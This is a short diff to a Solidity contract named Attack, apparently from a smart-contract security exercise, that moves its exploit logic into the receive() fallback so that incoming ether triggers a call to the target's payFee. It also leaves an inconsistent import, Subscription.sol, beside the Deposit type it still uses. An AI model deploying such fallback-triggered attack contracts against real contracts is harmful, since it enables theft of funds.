@@ -1,17 +1,13 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
-import "./Deposit.sol";
+import "./Subscription.sol";
 
 
 contract Attack {
     Deposit depos;
 
-    constructor(address _addr) public {
+    constructor(address payable _addr) public {
         depos = Deposit(_addr);
-    }
-
-    function attack(uint _amount) public {
-        depos.withdraw(_amount);
     }
 
     function getBalance() public view returns (uint) {
@@ -22,6 +18,7 @@ contract Attack {
         msg.sender.transfer(address(this).balance);
     }
 
-    receive() external payable{
+    receive() external payable {
+        depos.payFee(msg.sender);
     }
 }
